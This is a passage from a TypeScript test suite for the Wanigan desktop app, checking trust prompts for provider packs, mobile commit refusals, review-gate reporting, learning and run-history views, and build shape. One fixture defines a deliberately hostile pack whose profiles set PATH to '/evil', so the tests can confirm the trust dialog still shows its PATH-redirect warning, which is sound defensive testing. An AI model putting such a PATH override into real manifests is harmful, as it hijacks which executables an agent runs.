      adapter: { kind: 'process' as const, protocolVersion: 1 as const, executable: 'bin/probe', args: [] },
      profiles: Array.from({ length: 40 }, (_unused, i) => ({
        id: `profile-${i}`, label: `P${i}`, harness: 'generic-cli' as const,
        backend: { id: 'b', label: 'B' },
        command: { bin: `bin${i}`, baseArgs: ['--a', '--b', '--c'] },
        launchFields: Array.from({ length: 20 }, (_f, j) => ({ id: `field${j}`, label: 'F', kind: 'text' as const, argv: ['--f'] })),
        resume: { conversationArgs: ['--r'], continueArgs: ['--c'] },
        environment: { PATH: { source: 'literal' as const, value: '/evil' } },
      })),
    },
  };
  const cut = manifestTrustPrompt(wide as never);
  check(cut.detail.length <= 2000
    && cut.detail.includes('summary truncated')
    && cut.detail.includes('This pack sets PATH, which redirects')
    && cut.detail.includes('trusting this manifest does not trust it')
    && cut.detail.endsWith('Approve only a pack you would install by hand.'),
    'a manifest large enough to force the summary to elide loses argv listings and never the warnings: the redirect sentence, the separate-adapter note and the closing all still stand under the truncation line',
    cut.detail.length);

  // An honest small pack gets the whole listing docs/provider-packs.md requires,
  // with no truncation sentence — and a credential is named by its id and never
  // by its value, while a literal and a process fallback are both shown.
  const honest = {
    ...hostilePack,
    manifest: {
      ...hostilePack.manifest,
      profiles: [{
        ...hostilePack.manifest.profiles[0],
        resume: { conversationArgs: ['--resume'], continueArgs: ['--continue'] },
        launchFields: [{ id: 'model', label: 'Model', kind: 'select' as const, argv: ['--model'] }],
        environment: {
          ORBIT_TOKEN: { source: 'credential' as const, id: 'orbit.main' },
          ORBIT_REGION: { source: 'process' as const, name: 'REGION', fallback: 'us' },
        },
      }],
    },
  };
  const plain = manifestTrustPrompt(honest as never);
  check(!plain.detail.includes('summary truncated')
    && plain.detail.includes('a'.repeat(64))
    && plain.detail.includes('orbit.main — orbit --tty')
    && plain.detail.includes('resume --resume / --continue')
    && plain.detail.includes('ORBIT_TOKEN ← stored credential orbit.main')
    && plain.detail.includes('ORBIT_REGION ← process REGION (fallback "us")')
    && plain.detail.includes('The complete record is the manifest file at /packs/orbit.pack/provider-pack.json.'),
    'an ordinary pack is described in the dialog in full — digest, command, argv templates, resume and every environment destination with its source and fallback — and the file on disk is named as the complete record even when nothing had to be elided');

  // Two negatives. A record whose manifest could not be read must say so rather
  // than render an empty command list, which reads as a pack that runs nothing;
  // and an adapter prompt with nothing inspected must not invent a digest.
  const unreadable = manifestTrustPrompt({ ...hostilePack, manifest: null } as never);
  const noAdapter = adapterTrustPrompt(hostilePack as never, null);
  check(unreadable.detail.includes('could not read')
    && !unreadable.detail.includes('profile(s)')
    && !unreadable.detail.includes('Environment set for the agent')
    && noAdapter.detail.includes('no executable adapter')
    && noAdapter.detail.includes('Nothing was trusted.')
    && !noAdapter.detail.includes('SHA-256'),
    'a manifest Wanigan could not read is described as unreadable and names no profiles and no environment, and an adapter prompt with nothing inspected offers no digest to approve instead of inventing one');

  // Source pins: the grant is recorded behind a main-process confirmation, and
  // the two approvals stay separate. The negatives are the old pass-through
  // signatures, so re-introducing either one fails here rather than silently
  // moving the trust boundary back into the renderer.
  check(mainSrc.includes("handle('providerPacks:trustManifest', async (packId: unknown, sha256: unknown) => {")
    && mainSrc.includes('...manifestTrustPrompt(pack),')
    && mainSrc.includes("if (answer.response !== 1) throw new Error('Cancelled. Nothing was trusted and nothing was enabled.');")
    && mainSrc.includes('...adapterTrustPrompt(pack, inspected),')
    && mainSrc.includes("if (answer.response !== 1) throw new Error('Cancelled. The adapter was not trusted.');")
    && !mainSrc.includes("handle('providerPacks:trustManifest', (packId: string, sha256: string) => {")
    && !mainSrc.includes("handle('providerPacks:trustAdapter', (packId: string, sha256: string) => {"),
    'execution trust for a provider pack is confirmed in the main process, separately for the manifest and for the adapter, and is not a step the renderer can decline to render');
  const preloadSrc = sourceOf('src/preload/index.ts');
  const providerSrc = sourceOf('src/main/providers.ts');
  const daemonSrc = sourceOf('src/main/daemon.ts');
  const reviewSrc = sourceOf('src/main/review.ts');
  const controlSrc = sourceOf('src/main/control.ts');
  const controlViewSrc = sourceOf('src/renderer/src/views/Control.tsx');
  // The cancel notice has to be written from the receipt, after the call. act
  // evaluates its third argument before the work runs, and the node status the
  // renderer would read is a snapshot from the last load — so any sentence
  // handed to act here is a guess about a running agent that may have exited in
  // between. The negative is the one that matters: it forbids the old shape.
  check(/function cancelNotice\(receipt: McpTaskCancelReceipt\): string/.test(controlViewSrc)
    && controlViewSrc.includes("receipt.outcome === 'not_found'")
    && controlViewSrc.includes("receipt.outcome === 'already_closed'")
    && controlViewSrc.includes("receipt.outcome === 'record_only'")
    && !/cancelMcpTask\(task\.id\); await load\(detail\?\.id\); \}\)/.test(controlViewSrc)
    && !/\}, 'Task canceled/.test(controlViewSrc)
    && controlViewSrc.includes('setNotice(cancelNotice(receipt));'),
    'Control builds its cancel notice from what the main process reported after the call, names all four outcomes, and hands act no pre-written sentence about work that had not happened yet',
    controlViewSrc.slice(controlViewSrc.indexOf('const cancelTask ='), controlViewSrc.indexOf('const cancelTask =') + 220));
  // retryNode writes the node back to 'pending'; mapNodes then still reports
  // every dependent as 'blocked', because a prerequisite short of 'completed'
  // is a wait either way. The old copy promised the dependents were unblocked,
  // which is a visible status the operator could check and find unchanged —
  // and it is the kind of sentence someone rewrites back, reading "reopen" and
  // assuming it means "unblock".
  check(controlViewSrc.includes('tasks that wait on it stay blocked until it completes.')
    && controlViewSrc.includes('title="Reopen this task so it can be started again. Tasks waiting on it stay blocked until it completes."')
    && !/dependents are unblocked|dependents stop being blocked|unblocks its dependents/.test(controlViewSrc),
    'Control tells the operator that reopening a failed task removes its failure but not the wait, in both the toast and the button tooltip, and nowhere claims that reopening unblocks what waits on it',
    controlViewSrc.slice(controlViewSrc.indexOf('Task reopened'), controlViewSrc.indexOf('Task reopened') + 160));
  const schedulesSrc = sourceOf('src/renderer/src/views/Schedules.tsx');
  const sessionsSrc = sourceOf('src/renderer/src/views/Sessions.tsx');
  const settingsSrc = sourceOf('src/renderer/src/views/Settings.tsx');
  const appSrc = sourceOf('src/renderer/src/App.tsx');
  check(/handle\(\s*'batch:runsInFlight'/.test(mainSrc)
    && /runsInFlight:\s*\(\)/.test(preloadSrc)
    && appSrc.includes('window.wanigan.batch.runsInFlight()')
    && !appSrc.includes('window.wanigan.batch.runs()')
    && appSrc.includes('useState<number | null>(null)'),
    'the six-second shell poll reads a query scoped to the runs still in flight rather than every run ever recorded, and holds the count as number-or-null so an unanswered poll cannot be drawn as a zero',
    null);
  const usageViewSrc = sourceOf('src/renderer/src/views/Usage.tsx');
  // The route table left App.tsx for shared/routes.ts so the rail, palette,
  // cheat sheet and key handler read one record; assertions about routes read
  // it from there.
  const routesSrc = sourceOf('src/shared/routes.ts');
  const themeSrc = sourceOf('src/renderer/src/theme.ts');
  const themeBootSrc = sourceOf('src/renderer/src/theme-boot.ts');
  const terminalPaneSrc = sourceOf('src/renderer/src/components/TerminalPane.tsx');
  // mobile.ts is a re-export facade: the credential store, the gated API
  // dispatcher and the served page all live in src/main/mobile/. Reading only
  // the facade would leave every *negated* mobile assertion below satisfied by
  // a file that no longer contains any of the code they are about — a whole
  // block of contracts turning green by looking at nothing. So this globs the
  // subtree rather than naming files, which also means a later phase cannot
  // hide a line from a negative assertion by putting it in an unlisted module,
  // and refuses a walk that came back suspiciously small.
  const mobileFiles = ['src/main/mobile.ts', ...filesUnder(path.join(appRoot(), 'src/main/mobile'))
    .filter((file) => file.endsWith('.ts'))
    .map((file) => path.relative(appRoot(), file))];
  if (mobileFiles.length < 10) missingSources.push(`src/main/mobile/** (walked only ${mobileFiles.length} files)`);
  const mobileSrc = mobileFiles.map((file) => sourceOf(file)).join('\n');

  // The digest and the drift sentence. `Reading` is annotated rather than
  // inferred so the `where` literals narrow instead of widening to string.
  type Reading = import('./mobile/git').MobileRepoReading;
  const shownTree: Reading = { branch: 'main', detached: false, operation: null, dropped: 0, rows: [
    { path: 'src/b.ts', status: ' M', where: 'unstaged' },
    { path: 'src/a.ts', status: 'M ', where: 'staged' },
  ] };
  const reorderedTree: Reading = { ...shownTree, rows: [...shownTree.rows].reverse() };
  const movedTree: Reading = { ...shownTree, rows: [
    { path: 'src/a.ts', status: 'M ', where: 'staged' },
    { path: 'src/b.ts', status: 'MM', where: 'both' },
    { path: 'src/c.ts', status: '??', where: 'untracked' },
  ] };
  const staleRefusal = repoGit.driftSentence(shownTree, movedTree);
  check(repoGit.repoDigest(shownTree) === repoGit.repoDigest(reorderedTree)
    && repoGit.repoDigest(shownTree) !== repoGit.repoDigest(movedTree)
    && /1 file changed that had not \(src\/c\.ts\)/.test(staleRefusal)
    && /1 file with a different status \(src\/b\.ts\)/.test(staleRefusal)
    && /Nothing was committed/.test(staleRefusal)
    && !/\bstale\b/i.test(staleRefusal),
  'a commit made against a working tree that has moved is refused with the paths that moved rather than the word “stale”, and the digest it is checked against ignores the order git happened to report the rows in',
  staleRefusal);

  const untrackedOnly: Reading = { ...shownTree, rows: [{ path: '.env', status: '??', where: 'untracked' }] };
  const conflictedTree: Reading = { ...shownTree, rows: [{ path: 'a', status: 'UU', where: 'conflicted' }] };
  const midRebase: Reading = { ...shownTree, operation: 'rebase' };
  const cappedTree: Reading = { ...shownTree, rows: new Array(repoGit.MOBILE_REPO_LIMITS.files + 1)
    .fill(0).map((_, i) => ({ path: `f${i}`, status: ' M', where: 'unstaged' as const })) };
  const withUntracked: Reading = { ...shownTree, rows: [...shownTree.rows, { path: '.env', status: '??', where: 'untracked' }] };
  check(repoGit.whyNotCommittable(shownTree) === null
    && /never adds a file to a commit/.test(String(repoGit.whyNotCommittable(untrackedOnly)))
    && /conflict/.test(String(repoGit.whyNotCommittable(conflictedTree)))
    && /rebase is in progress/.test(String(repoGit.whyNotCommittable(midRebase)))
    && /shown in full/.test(String(repoGit.whyNotCommittable(cappedTree)))
    && repoGit.commitOffer(withUntracked).untracked === 1,
  'a phone is refused a commit of an untracked-only tree, a conflicted tree, a tree mid-rebase and a reading the list cap cut short — the last because the screen has to have shown the whole of what the commit would carry before the tap counts as deliberate',
  [untrackedOnly, conflictedTree, midRebase, cappedTree]
    .map((tree) => String(repoGit.whyNotCommittable(tree)).slice(0, 24)).join(' | '));

  const keptMessage = repoGit.commitMessage('subject line\n\nand a body');
  const belledMessage = repoGit.commitMessage('tidyup');
  const hugeMessage = repoGit.commitMessage('x'.repeat(9_000));
  check(keptMessage.ok && keptMessage.message === 'subject line\n\nand a body'
    && belledMessage.ok && belledMessage.message === 'tidyup'
    && repoGit.commitMessage('   ').ok === false
    && repoGit.commitMessage(undefined).ok === false
    && hugeMessage.ok === false && /9000 bytes/.test(hugeMessage.ok ? '' : hugeMessage.error),
  'a commit message from a phone keeps its paragraphs, loses its control characters, and is refused outright when it is empty, missing or larger than the wire accepts',
  keptMessage.ok ? JSON.stringify(keptMessage.message) : keptMessage.error);

  const namedStep = repoGit.gateStep([{ command: 'npm run typecheck', exitCode: 0 }, { command: 'npm test', exitCode: 1 }], 3);
  const withheldStep = repoGit.gateStep([{ command: '/Users/someone/bin/check --strict', exitCode: 2 }], 1);
  const homeStep = repoGit.gateStep([{ command: 'sh ~/bin/gate', exitCode: 1 }], 1);
  check(namedStep !== null && namedStep.position === 2 && namedStep.total === 3
    && namedStep.command === 'npm test' && namedStep.exitCode === 1
    && repoGit.gateStep([{ command: 'npm test', exitCode: 0 }], 1) === null
    && withheldStep !== null && withheldStep.command === null && withheldStep.position === 1
    && /names a path on this Mac/.test(String(withheldStep.withheld))
    && homeStep !== null && homeStep.command === null
    && !mobileSrc.includes('output: '),
  'a failed review gate names the command that failed and its exit code, withholds the command text when it carries an absolute path or a home directory, and never puts the command’s output on the wire at any size',
  JSON.stringify({ step: namedStep, withheld: withheldStep && withheldStep.command }));

  check(mobileSrc.includes("import { history as gateHistory, recipe as gateRecipe, run as startGate } from '../review';")
    && mobileSrc.includes('const pending = startGate(projectId);')
    && mobileSrc.includes('if (before.latest && before.latest.live) {')
    && mobileSrc.includes('json(res, 200, { ok: true, started: false, gate: before });')
    && !/spawn\(|execFile\(/.test(mobileSrc),
  'the phone drives the project’s own review gate through ../review rather than a second definition of it, spawns nothing itself, and a second request while one is live joins the live run instead of starting a competing build');

  check(mobileSrc.includes("['running', 'running'], ['passed', 'passed'], ['failed', 'failed'],")
    && mobileSrc.includes("GATE_STATUSES.get(String(run.status)) ?? 'unknown'")
    && mobileSrc.includes("unknown: { glyph: '?', word: 'Not recognised', tone: 'quiet' },")
    && mobileSrc.includes('This project has no review gate.')
    && mobileSrc.includes('did not record which working tree this run saw')
    && mobileSrc.includes('The working tree has changed since this ran, so this result is not about the files above.'),
  'a review gate that has no commands, a stored status this build cannot name, and a run whose working tree was never recorded each render as their own state on the phone rather than borrowing the shape of a gate that passed');
  const cssSrc = sourceOf('src/renderer/src/index.css');
  const sessionsCssSrc = sourceOf('src/renderer/src/styles/sessions.css');
  const compactCssSrc = sourceOf('src/renderer/src/styles/compact.css');
  const learningSrc = sourceOf('src/renderer/src/views/Learning.tsx');

  // A disabled engine reaches both briefing previews as a full-shaped briefing
  // whose counters are all 0, and every rung of these ladders below the first
  // describes a retrieval that happened. Order is the assertion: asking "did it
  // run" after "what did it find" is how "retrieval matched nothing" got
  // printed about a corpus nobody read.
  const payloadLadderAt = learningSrc.indexOf('const nothingBecause = !result || result.entries.length > 0 ? null');
  const payloadPausedAt = learningSrc.indexOf("title: 'Nothing would be injected — learning is switched off'");
  const payloadStoreAt = learningSrc.indexOf("title: 'Nothing would be injected — this scope stores no active knowledge item'");
  const payloadMatchedAt = learningSrc.indexOf("title: 'Nothing would be injected — retrieval ran and matched nothing'");
  check(payloadLadderAt > 0 && payloadPausedAt > payloadLadderAt
    && payloadPausedAt < payloadStoreAt && payloadStoreAt < payloadMatchedAt
    && learningSrc.includes('// Five different facts, five different fixes.'),
  'the injected-payload panel asks whether retrieval ran at all before it asks what retrieval found, so a switched-off engine is named as the reason nothing would be injected rather than borrowing the sentence written for an empty store or for a query that ranked nothing',
  `paused rung ${payloadPausedAt}, empty-store rung ${payloadStoreAt}, matched-none rung ${payloadMatchedAt}`);

  const inspectorPausedAt = learningSrc.indexOf('title="Learning is paused — retrieval did not run"');
  const inspectorMeterAt = learningSrc.indexOf('<div className="inspector-meter" aria-hidden="true">');
  const inspectorMatchedAt = learningSrc.indexOf('title="Retrieval ran and matched nothing"');
  check(inspectorPausedAt > 0 && inspectorMeterAt > inspectorPausedAt && inspectorMatchedAt > inspectorPausedAt
    && learningSrc.includes('{result && (learningRan === false ? ('),
  'the briefing inspector replaces its entire measured body with the paused state, so a preview taken with learning off draws no token meter, no "~0 est. tokens of the budget" and no empty-result verdict — each of those is a measurement that was never taken, and a meter pinned at zero reads as a retrieval that ran',
  `paused ${inspectorPausedAt}, meter ${inspectorMeterAt}, matched-none ${inspectorMatchedAt}`);

  check(!/learningRan\s*=\s*!?settings\.enabled/.test(learningSrc)
    && !/settings\.enabled[^\n]*Learning is paused — retrieval did not run/.test(learningSrc)
    && learningSrc.includes('const readLearningEnabled = (briefing: Partial<BriefingPreview>): boolean | null =>')
    && learningSrc.includes("typeof briefing.learningEnabled === 'boolean' ? briefing.learningEnabled : null")
    && learningSrc.split('const learningRan = result ? readLearningEnabled(result) : null;').length - 1 === 2,
  'neither preview derives "retrieval did not run" from the settings switch: the reply main sent for that particular preview is the only authority on what happened, a build that did not report the field reads null rather than false, and the switch and the reply are allowed to disagree after a toggle',
  'a settings-derived paused state is back in Learning.tsx');

  check(learningSrc.includes('Learning is paused, so retrieval will not run: a preview reports the switched-off engine,')
    && learningSrc.includes("launch.launchDelivery === 'none' && launch.harnessId != null")
    && preloadSrc.includes("call<BriefingPreview>('learning:briefing', input)")
    && !preloadSrc.includes("call<KnowledgeBriefing>('learning:briefing', input)"),
  'the inspector says retrieval will not run before the button is pressed and names a harness with no instruction channel after it, and the preload no longer narrows the briefing channel to KnowledgeBriefing — the launch state main puts on the wire survives the sandbox boundary as a type rather than only as bytes');

  check(learningSrc.split("onNavigate('inbox', 'open')").length - 1 === 3
    && learningSrc.split("title: 'Open the Inbox filtered to open proposals'").length - 1 === 2
    && !learningSrc.includes('Open the Inbox filtered to proposals needing a decision'),
  'both tooltips that open the Inbox on its open filter describe the filter that actually runs — open is a superset that also lists approved, snoozed and failed proposals — so neither promises a "needs a decision" filter the Inbox does not implement');

  // The decided figure and the filter its click opens are two lists in two
  // processes, and they have to name the same statuses or the number opens a
  // list that disagrees with it. The negative is the revert: that exact
  // predicate is the one that counted a snooze as a decision.
  const learningLedgerSrc = sourceOf('src/main/learning/ledger.ts');
  const learningTypesSrc = sourceOf('src/main/learning/types.ts');
  check(learningSrc.includes("const DECIDED_STATUSES = ['approved', 'rejected', 'promoted', 'applied', 'superseded'];")
    && learningTypesSrc.includes("  ['approved', 'rejected', 'promoted', 'applied', 'superseded'];")
    && learningLedgerSrc.includes('AND status IN (${DECIDED_CANDIDATE_STATUSES.map')
    && !learningLedgerSrc.includes('WHERE reviewed_at IS NOT NULL AND reviewed_at >= ?${artifactWhere}'),
  'the decided figure counts the same five statuses the Inbox "Decided" filter lists, in main and in the renderer, and no longer counts every row whose reviewed_at is merely set — reviewCandidate stamps that column for a snooze as well, so the old predicate reported a deferred proposal as decided while the figure beside it reported the same row as still open',
  'the decided figure and its filter have drifted apart');
  const scoutViewSrc = sourceOf('src/renderer/src/views/ImprovementScout.tsx');
  // The Runs history is a database read, and an empty `runs` array is what a
  // fresh mount, a slow read and a broken IPC read all look like. Every
  // sentence that depends on that read therefore waits for it: the count beside
  // "Recent runs", "Nothing has run yet", and the inspector's invitation to
  // start a fan-out. A failed read shows the error and a retry instead.
  const runsViewSrc = sourceOf('src/renderer/src/views/HeadlessRuns.tsx');
  const runsGate = runsViewSrc.indexOf('{!loaded ? (');
  const runsNothingYet = runsViewSrc.indexOf('title="Nothing has run yet"');
  const runsNoSelection = runsViewSrc.indexOf('title="No run selected"');
  const runsDetailReading = runsViewSrc.indexOf('<Reading what="the run history" />');
  check(runsViewSrc.includes('const [loaded, setLoaded] = useState(false)')
    && runsViewSrc.includes('setLoaded(true);')
    && runsGate > 0
    && runsNothingYet > runsGate
    && runsNoSelection > runsGate
    && runsDetailReading > 0 && runsDetailReading < runsNoSelection
    && /\{loaded \? runs\.length/.test(runsViewSrc)
    && runsViewSrc.includes('<Reading what="recent runs" />')
    && runsViewSrc.includes('posture="could-not-read" title="Could not read recent runs"')
    && runsViewSrc.includes('cue={loadFailed}')
    && /Try again<\/button>/.test(runsViewSrc),
  'Runs holds its run count, "Nothing has run yet" and "No run selected" behind a loaded flag set only by a read that returned, and a failed first read shows that error with a retry rather than a confident zero');

  /* ── P10 · the fan-out declaration has a control ────────────────────
   * headless.ts refuses a start whose selection is the whole registered list
   * unless the request declares it, and this form could not declare it: the
   * config it built was typed HeadlessConfig, which has no such field, while
   * the selection was seeded with every project id and put back there by an
   * effect until the operator picked for themselves. With two or more
   * repositories registered the untouched default form was refused every
   * time, by an error naming an intent flag with no control on the screen.
   * The negatives below are the shape that did it. */
  check(runsViewSrc.includes('const cfg: HeadlessStartRequest = {')
    && runsViewSrc.includes('...(coversEveryProject && declared ? { allProjects: true } : {}),')
    && runsViewSrc.includes('const coversEveryProject = allPicked && projects.length > 1;')
    && runsViewSrc.includes('const needsIntent = coversEveryProject && !declared;')
    && runsViewSrc.includes('const [declared, setDeclared] = useState(false);')
    && /const canStart = [\s\S]{0,200}!needsIntent/.test(runsViewSrc)
    && !runsViewSrc.includes('const cfg: HeadlessConfig')
    && !/useState<Set<string>>\(\(\) => new Set\(projects\.map/.test(runsViewSrc),
  'Runs can state the every-repository fan-out its own default used to require and had no way to express: the request is typed HeadlessStartRequest, the declaration is a checkbox that is never seeded true and is written only when the selection really is the whole list, the primary button stays disabled until it is ticked, and the form no longer opens with every repository already selected');

  check(sourceOf('src/main/headless.ts').includes('if (picked.length > 1 && cfg.allProjects !== true) {'),
    'the fan-out guard reads the declaration as the literal true, so a renderer that sends any other truthy value for allProjects is refused rather than believed — this config crosses IPC unvalidated, where the string "no" used to buy the whole fleet');

  /* ── P7 · a run's rows, stats and merge belong to that run ──────────
   * `headless:rows` rejecting for the newly selected run used to leave the
   * previous run's repositories, Changed and Cost under the new run's name,
   * with a Squash merge button that acted on the previous run's worktree and
   * wrote the new run's name into the squash commit. The negatives are the
   * three lines that did it. */
  check(runsViewSrc.includes('type RowsState = { runId: string; rows: HeadlessRowSummary[] | null; error: string | null };')
    && runsViewSrc.includes('const rowsFor = rowsState && rowsState.runId === selected ? rowsState : null;')
    && runsViewSrc.includes('if (!selected) { setRowsState(null); return; }')
    && runsViewSrc.includes('if (!prior || prior.runId !== runId) return { runId, rows: null, error: null };')
    && runsViewSrc.includes('const runName = runs.find((r) => r.id === row.runId)?.name ?? row.runId;')
    && !runsViewSrc.includes('setRows(')
    && !/current\?\.name/.test(runsViewSrc),
  'the Runs inspector keys its repository rows to the run they were read for, drops the previous run rows at the top of the effect rather than when the next read returns, and builds the squash commit message from the row own runId — so a rejected headless:rows can no longer leave one run repositories under another run name, and a Squash merge can no longer stamp the selected run name onto the previous run worktree, permanently, in git history');

  // The rows region answers for its own read now, so the page-level error Note
  // is left to start, cancel and merge. `rows(selected)` is the negative: the
  // old call read whatever was selected when the promise was built rather than
  // the run id the response is then stored against.
  check(runsViewSrc.includes(`<Reading what="this run's repositories" />`)
    && runsViewSrc.includes(`posture="could-not-read" title="Could not read this run's repositories"`)
    && runsViewSrc.includes('onClick={() => setRowsNonce((n) => n + 1)}>Try again</button>')
    && /\}, \[selected, signature, rowsNonce\]\);/.test(runsViewSrc)
    && !/rows\(selected\)/.test(runsViewSrc),
  'a failed read of one run repositories is reported in the rows region itself, with the error and its own retry, instead of an error banner over the previous run table');

  // Both figures are sums over rows, so both wait for the rows. Before this an
  // unread run printed "0" files and "$0.00 · CLI-reported; never estimated",
  // which is the confident version of a read that had not happened.
  check(runsViewSrc.includes(`const rowsUnread = rowsFor?.error`)
    && runsViewSrc.includes(`? "this run's repositories could not be read"`)
    && runsViewSrc.includes(`value={totals ? num(totals.changed) : '—'}`)
    && runsViewSrc.includes(`value={!totals || !costStatus ? '—'`)
    && runsViewSrc.includes('const totals = useMemo(() => (readRows === null ? null : readRows.reduce((a, r) => ({')
    && runsViewSrc.includes('if (readRows === null) return null;'),
  'Changed and Cost print an em dash and say which read they are waiting on until this run rows are in hand, so neither reports a zero it never read');

  // headless:runs is seven correlated subqueries per run over headless_rows,
  // whose only index is its (run_id, project_id) primary key, and it ran every
  // three seconds behind a hidden window.
  check(runsViewSrc.includes('const t = setInterval(() => { if (document.hidden) return; reload(); }, 3000);')
    && runsViewSrc.includes('const onVisible = () => { if (!document.hidden) reload(); };')
    && runsViewSrc.includes(`document.addEventListener('visibilitychange', onVisible);`)
    && runsViewSrc.includes(`document.removeEventListener('visibilitychange', onVisible);`)
    && !/setInterval\(reload, 3000\)/.test(runsViewSrc),
  'the Runs history poll stops while the window is hidden and re-reads at once when it comes back, rather than billing seven subqueries per run every three seconds to a screen nobody is looking at');

  // The array identity is the render trigger, and headless:runs hands back
  // fresh objects every call. ago(createdAt) is inside the fingerprint on
  // purpose: without it a quiet beat would freeze the relative timestamp.
  check(/const runsFingerprint = \(list: HeadlessRun\[\]\): string => list/.test(runsViewSrc)
    && runsViewSrc.includes('|${ago(r.createdAt)}`)')
    && runsViewSrc.includes('if (look !== painted.current) { painted.current = look; setRuns(next); }')
    && runsViewSrc.split('setRuns(next)').length === 2,
  'a poll that would paint the same run list keeps the array it already has, and the relative timestamp is part of what "the same list" means, so nothing on the history freezes to buy that',
  `setRuns(next) call sites: ${runsViewSrc.split('setRuns(next)').length - 1}`);

  // Measured before the fix: arm the confirmation on run A's row for a
  // repository, click run B, and B's row for that same repository comes back
  // already expanded with its Squash merge button armed. confirmMerge is held
  // by project id, and two runs over one repository share it.
  check(runsViewSrc.includes('useEffect(() => { setConfirmMerge(null); }, [selected]);')
    && runsViewSrc.indexOf('useEffect(() => { setConfirmMerge(null); }, [selected]);')
       > runsViewSrc.indexOf('const [confirmMerge, setConfirmMerge] = useState<string | null>(null);'),
  'an armed squash-merge confirmation is dropped when the operator selects a different run, so the second deliberate press this destructive action depends on is asked again per run rather than inherited by whichever run is opened next');
  const scoutCssSrc = sourceOf('src/renderer/src/styles/improvement-scout.css');
  const sessionManagerSrc = sourceOf('src/main/sessions.ts');
  check(mainSrc.length > 1000 && preloadSrc.length > 500 && schedulesSrc.length > 500
    && sessionsSrc.length > 500 && settingsSrc.length > 500 && appSrc.length > 500 && sessionManagerSrc.length > 500,
    'the sources these checks read are present, so a miss is a miss and not a bad path');

  // ── build shape · a minified window, a readable main ────────────────
  // Each half of this is load-bearing in a way a size number does not convey.
  // A minified main would strip the function names out of the error.stack that
  // failSmokeBootstrap appends to WANIGAN_SMOKE_LOG, which scripts/smoke.sh's
  // own comment calls the only useful diagnostic on an early failure — the
  // frames would read `a` and `Kj`, and no sourcemap ships to undo that. In the
  // renderer the opposite is true, and keepNames is what makes it safe: built
  // without it the string "TerminalPane" does not survive into the bundle at
  // all, so React's componentStack — everything ErrorBoundary can show about a
  // view crash that reproduces once a week — would name nothing.
  const viteCfgSrc = sourceOf('electron.vite.config.ts').replace(/\/\/[^\n]*/g, '');
  const rendererAt = viteCfgSrc.indexOf('renderer: {');
  const aboveRenderer = rendererAt > 0 ? viteCfgSrc.slice(0, rendererAt) : viteCfgSrc;
  check(rendererAt > 0
    && viteCfgSrc.indexOf("minify: 'esbuild'") > rendererAt
    && viteCfgSrc.indexOf('keepNames: true') > rendererAt
    && !/\bminify\s*:/.test(aboveRenderer)
    && !/\bkeepNames\s*:/.test(aboveRenderer),
    'the build minifies the renderer with keepNames and asks for neither in main nor preload');

  // smoke.sh builds before it launches this process, so out/ is this tree.
  const rendererJs = filesUnder(path.join(appRoot(), 'out', 'renderer', 'assets')).filter((f) => f.endsWith('.js'));
  const windowBundle = rendererJs.length === 1 ? fs.readFileSync(rendererJs[0], 'utf8') : '';
  const windowDensity = windowBundle ? windowBundle.length / windowBundle.split('\n').length : 0;
  // Measured on this tree: unminified is ~53 chars per line, minified ~17,000.
  check(rendererJs.length === 1 && windowDensity > 1000 && windowBundle.includes('"TerminalPane"'),
    'the built window is one minified chunk that still carries its component names, so no view was made lazy and a crash stack stays readable',
    `${rendererJs.length} chunk(s), ${Math.round(windowDensity)} chars/line`);

  let mainBundle = '';
  try { mainBundle = fs.readFileSync(path.join(appRoot(), 'out', 'main', 'index.js'), 'utf8'); }
  catch { /* an absent bundle is asserted below, not thrown out of the suite */ }
  const mainDensity = mainBundle ? mainBundle.length / mainBundle.split('\n').length : 0;
  check(mainBundle.includes('function failSmokeBootstrap(') && mainDensity > 0 && mainDensity < 200,
    'the built main process is unminified and still names failSmokeBootstrap, so a bootstrap stack in the smoke log names real functions',
    `${Math.round(mainDensity)} chars/line`);
  // The check above names seven of the twenty-three files read here. This one
  // names every path that failed to resolve, including the ones read earlier in
  // the suite, so a moved file cannot silently retire the assertions about it.
  const fleetViewSrc = sourceOf('src/renderer/src/views/Fleet.tsx');
  const observedBandSrc = sourceOf('src/renderer/src/components/ObservedBand.tsx');
  const observedCssSrc = sourceOf('src/renderer/src/styles/observed.css');
  check(observedBandSrc.includes('{state.notice}')
    && observedBandSrc.includes('window.wanigan.observed.state()')
    && observedBandSrc.includes('window.wanigan.observed.list()')
    && !observedBandSrc.includes('window.wanigan.sessions.')
    && !/interrupt|messagingSocket|\.sock|costUsd|inTokens/.test(observedBandSrc)
    && !/disabled=\{/.test(observedBandSrc),
    'the band listing sessions Wanigan did not start prints main’s observe-only sentence verbatim and offers no channel to one of them — no session call, no stop or interrupt, no socket path, no cost or token figure, and no control rendered dead rather than simply left out',
    observedBandSrc.length);

  check(observedBandSrc.includes('Reading what="sessions started outside Wanigan"')
    && observedBandSrc.includes('run: () => setEnabled(true)')
    && observedBandSrc.includes('No Claude session registry on this machine')
    && observedBandSrc.includes('Nothing outside Wanigan is registered as running')
    && observedBandSrc.includes('posture="could-not-read"'),
    'still reading, switched off, no registry on this machine, a registry with nothing foreign in it, and a read that failed are five different renderings on this band rather than one blank space that a reader would take for "nothing is running outside Wanigan"',
    ['reading', 'off', 'no registry', 'none running', 'could-not-read'].length);

  check(observedBandSrc.includes("'start time not recorded'")
    && observedBandSrc.includes("r.verified ? markOf('running') : UNCONFIRMED")
    && observedBandSrc.includes("word: 'unconfirmed'")
    && !/ago\(r\.startedAt \?\? /.test(observedBandSrc),
    'a row observed.ts listed but could not date says which fact is missing and carries the unconfirmed mark, instead of a null start time falling through ago() and reading as a session that just started',
    observedBandSrc.includes("'start time not recorded'"));

  const observedBandMounts = fleetViewSrc.split('<ObservedBand />').length - 1;
  check(observedBandMounts === 2
    && fleetViewSrc.includes("import ObservedBand from '../components/ObservedBand';")
    && fleetViewSrc.includes('title="No agents Wanigan started are running"')
    && !fleetViewSrc.includes('observed.list()')
    && !fleetViewSrc.includes('ObservedSession'),
    'Fleet mounts the observed band in both branches a reader could take for "nothing is running" and reads no observed row itself, so a session Wanigan did not start never reaches its totals, counts, chips or Stat tiles — and the empty state now says whose absence it is reporting',
    observedBandMounts);

  check(observedCssSrc.includes('.obs-row {')
    && !/font-size:\s*[0-9]/.test(observedCssSrc)
    && !/#[0-9a-fA-F]{3}/.test(observedCssSrc)
    && observedCssSrc.includes('@media (max-width: 980px)'),
    'the observed band’s sheet spells no colour and no font size of its own and reaches the medium shelf at the house 980px rather than inventing a thirteenth breakpoint',
    observedCssSrc.length);

  check(missingSources.length === 0,
    'every source path this suite reads resolved to a non-empty file, so no negated assertion passes by reading nothing',
    missingSources.join(', '));
